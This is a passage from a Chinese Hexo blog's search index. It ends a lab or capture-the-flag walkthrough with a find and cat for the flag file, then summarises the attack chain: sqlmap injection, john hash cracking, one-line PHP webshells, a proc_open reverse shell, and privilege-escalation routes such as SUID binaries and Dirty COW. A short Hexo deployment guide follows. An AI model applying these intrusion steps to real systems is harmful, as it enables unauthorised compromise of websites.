alt="image-20240704123736857"></p><p>接下来就是要找到那个唯一的flag文件了，启用find命令查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124000907.png" alt="image-20240704124000907"></p><p>cat一下看看啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124054377.png" alt="image-20240704124054377"></p><p>至此，所有工作完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sqlmap注入、john碰撞爆破hash、一句话木马注入、通过prop_open反弹shell</p><ul><li><p>拿站后进行提权的方式多样，其中包括</p><ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li><p>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</p></li><li><p>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关部署GitHub博客的坑</title>
    <link href="/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <url>/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>也就是说，如果想创建一个新的博客。执行步骤是：</p><ul><li>新建一个空文件夹</li><li>终端进入该文件夹中，hexo init</li><li>需要下载git，npm install hexo-deployer-git -save</li><li>然后修改博客目录下的 _config.yml 文件，修改语言（注意，名字需要先到主题文件夹下的language上查看，不要拼写错名字了）</li><li>添加deploy配置，type（git），repo（仓库的ssh链接），branch（main）</li><li>hexo g</li><li>hexo d</li><li>hexo s查看效果</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
